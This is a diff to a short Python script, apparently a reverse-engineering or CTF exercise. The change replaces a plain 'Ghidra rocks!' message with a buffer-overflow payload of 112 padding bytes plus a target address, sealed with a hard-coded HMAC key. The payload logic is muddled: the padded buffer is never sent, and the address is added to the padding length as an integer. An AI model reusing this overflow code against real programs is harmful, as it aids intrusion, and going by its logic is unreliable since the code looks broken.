@@ -3,7 +3,6 @@ import hashlib
 import hmac
 import base64
 
-data = "Ghidra rocks!"
 
 """
 4e1435fd
@@ -15,6 +14,15 @@ bb09d1d
 49d153bb
 d4880319
 """
+addyofblinker = 0x080496d7
+padding = b'A' * 112
 
-mac_addy = hmac.new(b'\xfd\x35\x14\x4e\xf3\x92\x07\xab\x08\x82\xae\x7a\x1d\xd1\x09\xbb\x4f\x68\x77\x8d\x71\x5b\x69\x99\xbb\x53\xd1\x49\x19\x03\x88\xd4', b'Ghidra rocks!', hashlib.sha256)
-sys.stdout.buffer.write(len(data).to_bytes(4, 'little') + b'Ghidra Rocks!' + mac_addy.digest())
+data = padding + bytes.fromhex("080496d7")
+
+data2 = 112 + 0x080496d7
+
+mac_addy = hmac.new(bytes.fromhex("fd35144ef39207ab0882ae7a1d9db00b4f68778d715b6999bb53d149190388d4"), data2.to_bytes(4,'little'), hashlib.sha256)
+sys.stdout.buffer.write(len(data2.to_bytes(4,'little')).to_bytes(4, 'little') + data2.to_bytes(4,'little') + mac_addy.digest())
+
+
+
